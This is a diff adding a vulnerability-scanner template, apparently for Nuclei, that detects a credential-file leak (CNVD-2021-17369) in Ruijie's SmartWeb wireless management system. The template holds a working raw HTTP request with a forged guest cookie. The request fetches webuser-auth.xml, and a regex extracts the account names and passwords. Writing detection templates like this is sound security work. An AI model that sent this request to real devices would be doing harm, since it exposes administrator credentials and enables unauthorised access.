@@ -1,0 +1,33 @@
+id: cnvd-2021-17369
+info:
+  name: Ruijie Wireless SmartWeb Infoleak
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Ruijie wireless SmartWeb management system allows low-privilege users to read a file containing other accounts and passwords.
+  tags: information-disclosure
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369
+
+http:
+  - raw:
+      - |
+        GET /web/xml/webuser-auth.xml HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: login=1; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<userauth><user><name><![CDATA[   admin]]></name><password>"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<name><!\\[CDATA\\[\\s*(.*?)]]></name><password><!\\[CDATA\\[\\s*(.*?)]]></password>"
+        group: 1
